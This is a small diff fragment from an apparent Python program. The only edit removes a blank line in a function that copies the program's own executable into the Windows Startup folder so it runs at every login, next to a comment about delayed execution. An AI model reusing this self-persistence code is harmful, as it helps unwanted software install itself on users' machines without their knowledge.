@@ -54,7 +54,6 @@ execute_time = 15 #one day to execute
 #test passed
 def _add_to_startup():
     try:
-
         pic_path = os.path.join(os.path.expandvars("%userprofile%"),
                 "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
         shutil.copy2(os.getcwd() +'/'+ os.path.splitext(__file__)[0] + ".exe",\
